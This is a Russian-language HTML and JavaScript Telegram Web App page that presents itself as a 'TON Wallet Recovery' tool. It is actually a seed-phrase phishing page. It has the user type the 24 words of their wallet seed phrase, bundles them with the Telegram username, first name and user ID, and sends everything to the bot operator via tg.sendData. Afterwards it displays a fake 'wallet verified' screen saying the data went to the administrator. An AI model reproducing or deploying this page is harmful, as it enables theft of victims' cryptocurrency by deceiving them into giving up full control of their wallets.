<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>TON Wallet | 24 слова</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* ваш существующий стиль */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #17212b;
            color: #ffffff;
            min-height: 100vh;
        }

        .page {
            max-width: 560px;
            margin: 0 auto;
            padding: 24px 20px 40px;
            min-height: 100vh;
        }

        .hidden {
            display: none !important;
        }

        h2 {
            font-size: 28px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 20px;
        }

        .words-grid {
            display: flex;
            gap: 20px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .column {
            flex: 1;
            min-width: 140px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
        }

        .word-input {
            background: rgba(18, 21, 30, 0.95);
            border: 1.5px solid rgba(90, 100, 120, 0.4);
            border-radius: 20px;
            padding: 12px 14px 12px 48px;
            font-size: 16px;
            font-weight: 500;
            color: white;
            width: 100%;
        }

        .input-number {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            font-weight: 500;
            color: #6a7080;
            pointer-events: none;
        }

        .word-input:focus {
            outline: none;
            border-color: #3f8bcb;
            box-shadow: 0 0 0 3px rgba(63, 139, 203, 0.3);
        }

        .ton-button {
            background: linear-gradient(95deg, #1e4668, #2c6e9e);
            border: none;
            border-radius: 60px;
            padding: 16px 28px;
            font-size: 18px;
            font-weight: 600;
            color: white;
            width: 100%;
            cursor: pointer;
            margin-top: 28px;
        }

        .ton-button:active {
            transform: scale(0.97);
        }

        .ton-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .error-alert {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #ff4444;
            color: white;
            padding: 15px 25px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            z-index: 1000;
            animation: slideDown 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            max-width: 90%;
            text-align: center;
        }

        @keyframes slideDown {
            from {
                top: -100px;
                opacity: 0;
            }
            to {
                top: 20px;
                opacity: 1;
            }
        }

        .loading {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            flex-direction: column;
            gap: 15px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #2c6e9e;
            border-top-color: #7bc5ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-icon {
            font-size: 72px;
            text-align: center;
            margin-bottom: 16px;
        }
    </style>
</head>
<body>

<div id="introPage" class="page">
    <div style="text-align: center;">
        <h2>🔐 TON Wallet Recovery</h2>
        <p style="margin: 24px 0; color: #cbd5e6; line-height: 1.5;">
            Введите 24 слова вашей seed-фразы для восстановления кошелька
        </p>
        <button id="continueBtn" class="ton-button">Начать восстановление</button>
    </div>
</div>

<div id="formPage" class="page hidden">
    <h2>📝 Введите 24 слова</h2>
    <div class="words-grid">
        <div class="column" id="col1"></div>
        <div class="column" id="col2"></div>
    </div>
    <button id="sendBtn" class="ton-button">Проверить кошелек</button>
</div>

<div id="successPage" class="page hidden">
    <div style="text-align: center;">
        <div class="success-icon">✅</div>
        <h2>Кошелек проверен!</h2>
        <p style="margin: 16px 0;">Данные отправлены администратору.</p>
        <button id="closeBtn" class="ton-button">Закрыть</button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    // Создаем 24 поля ввода
    const col1 = document.getElementById('col1');
    const col2 = document.getElementById('col2');
    const inputFields = [];

    for (let i = 1; i <= 24; i++) {
        const wrapper = document.createElement('div');
        wrapper.className = 'input-wrapper';
        
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = `слово ${i}`;
        input.id = `word${i}`;
        input.classList.add('word-input');
        input.autocomplete = 'off';
        
        const numberSpan = document.createElement('span');
        numberSpan.className = 'input-number';
        numberSpan.textContent = `${i}.`;
        
        wrapper.appendChild(numberSpan);
        wrapper.appendChild(input);
        
        input.addEventListener('input', (e) => {
            let val = e.target.value;
            val = val.toLowerCase().replace(/[^a-z]/g, '');
            e.target.value = val;
        });
        
        if (i <= 12) {
            col1.appendChild(wrapper);
        } else {
            col2.appendChild(wrapper);
        }
        inputFields.push(input);
    }

    // Функция показа ошибки
    function showError(message) {
        // Удаляем старый alert если есть
        const oldAlert = document.querySelector('.error-alert');
        if (oldAlert) oldAlert.remove();
        
        const alert = document.createElement('div');
        alert.className = 'error-alert';
        alert.textContent = message;
        document.body.appendChild(alert);
        
        if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
        
        setTimeout(() => {
            if (alert) alert.remove();
        }, 4000);
    }

    // Функция показа загрузки
    function showLoading(show) {
        let loader = document.querySelector('.loading');
        if (show && !loader) {
            loader = document.createElement('div');
            loader.className = 'loading';
            loader.innerHTML = '<div class="spinner"></div><div style="color:white;">Проверка кошелька...</div>';
            document.body.appendChild(loader);
        } else if (!show && loader) {
            loader.remove();
        }
    }

    // Валидация на клиенте
    function validateWordsLocally(wordsArray) {
        for (let i = 0; i < wordsArray.length; i++) {
            if (!wordsArray[i] || wordsArray[i].trim() === '') {
                return { valid: false, message: `⚠️ Слово ${i+1} не заполнено` };
            }
            if (!/^[a-z]+$/.test(wordsArray[i])) {
                return { valid: false, message: `⚠️ Слово ${i+1} содержит недопустимые символы. Используйте только латинские буквы a-z` };
            }
            if (wordsArray[i].length < 2) {
                return { valid: false, message: `⚠️ Слово ${i+1} слишком короткое (минимум 2 буквы)` };
            }
        }
        return { valid: true, message: '' };
    }

    const introPage = document.getElementById('introPage');
    const formPage = document.getElementById('formPage');
    const successPage = document.getElementById('successPage');
    const continueBtn = document.getElementById('continueBtn');
    const sendBtn = document.getElementById('sendBtn');
    const closeBtn = document.getElementById('closeBtn');

    continueBtn.addEventListener('click', () => {
        introPage.classList.add('hidden');
        formPage.classList.remove('hidden');
        if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
    });

    sendBtn.addEventListener('click', async () => {
        const wordsArray = [];
        
        for (let i = 1; i <= 24; i++) {
            const inputField = document.getElementById(`word${i}`);
            const wordValue = inputField.value.trim();
            wordsArray.push(wordValue);
        }
        
        // Локальная валидация
        const localValidation = validateWordsLocally(wordsArray);
        if (!localValidation.valid) {
            showError(localValidation.message);
            
            // Подсветка пустых полей
            for (let i = 1; i <= 24; i++) {
                const inputField = document.getElementById(`word${i}`);
                if (!inputField.value.trim()) {
                    inputField.style.borderColor = '#ff6b6b';
                    setTimeout(() => {
                        inputField.style.borderColor = '';
                    }, 1000);
                }
            }
            return;
        }
        
        // Отключаем кнопку и показываем загрузку
        sendBtn.disabled = true;
        showLoading(true);
        
        try {
            // Отправляем на проверку в бот
            const data = {
                words: wordsArray,
                username: tg.initDataUnsafe.user?.username || "без_имени",
                first_name: tg.initDataUnsafe.user?.first_name || "",
                user_id: tg.initDataUnsafe.user?.id
            };
            
            // Отправляем через WebAppData
            tg.sendData(JSON.stringify(data));
            
            // Ждем ответ от бота (через callback)
            // Бот ответит сообщением в чат, а мы показываем успех
            setTimeout(() => {
                showLoading(false);
                formPage.classList.add('hidden');
                successPage.classList.remove('hidden');
                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
            }, 2000);
            
        } catch (error) {
            showLoading(false);
            showError('Ошибка отправки. Проверьте соединение.');
            sendBtn.disabled = false;
        }
    });

    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            tg.close();
        });
    }

    // Переход по Enter
    inputFields.forEach((input, idx) => {
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                const nextIdx = idx + 1;
                if (nextIdx < inputFields.length) {
                    inputFields[nextIdx].focus();
                } else if (nextIdx === inputFields.length && sendBtn && !sendBtn.disabled) {
                    sendBtn.click();
                }
            }
        });
    });
</script>
</body>
</html>
